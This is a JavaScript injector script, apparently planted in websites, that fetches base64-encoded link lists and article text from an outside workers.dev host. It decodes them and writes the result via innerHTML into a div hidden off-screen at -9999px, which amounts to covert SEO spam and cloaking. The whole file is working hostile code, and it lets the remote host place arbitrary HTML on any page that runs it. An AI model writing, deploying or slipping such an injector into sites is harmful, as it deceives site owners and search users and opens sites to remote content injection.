!function(){
try{
  if(document.getElementById("bunker-payload-2")) return;

  const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
  const TOKEN = "seo_mafia_web";

  const decode = (s) => {
    try {
      return new TextDecoder().decode(
        Uint8Array.from(atob(s), c => c.charCodeAt(0))
      );
    } catch(e) {
      console.error("Decode error:", e);
      return "";
    }
  };

  async function getData(id){
    try{
      const res = await fetch(
        `${API_BASE}/data-value?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`,
        { cache: "no-store" }
      );

      if(!res.ok) throw new Error("Fetch failed: " + res.status);

      const json = await res.json();

      if(!json || !json.payload) throw new Error("Invalid payload");

      return decode(json.payload);

    }catch(err){
      console.error("Fetch error ("+id+"):", err);
      return "";
    }
  }

  Promise.all([
    getData("b1"),
    getData("a1")
  ]).then(([anchorsRaw, articleRaw]) => {

    if(!anchorsRaw || !articleRaw){
      console.warn("Data kosong, inject dibatalkan");
      return;
    }

    const anchors = anchorsRaw
      .split("\n")
      .map(x => x.trim())
      .filter(Boolean)
      .map(line => {
        const parts = line.split("|");
        if(parts.length < 2) return "";
        return `<a href="${parts[1].trim()}">${parts[0].trim()}</a>`;
      })
      .filter(Boolean);

    let i = 0;
    const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
      return anchors.length ? anchors[i++ % anchors.length] : "";
    });

    function inject(){
      if(document.getElementById("bunker-payload-2")) return;

      const box = document.createElement("div");
      box.id = "bunker-payload";
      box.style.position = "absolute";
      box.style.left = "-9999px";
      box.innerHTML = html;

      document.body.appendChild(box);
      console.log("Inject sukses");
    }

    if(document.readyState !== "loading"){
      inject();
    }else{
      document.addEventListener("DOMContentLoaded", inject);
    }

  });

}catch(e){
  console.error("Injector fatal error:", e);
}
}();
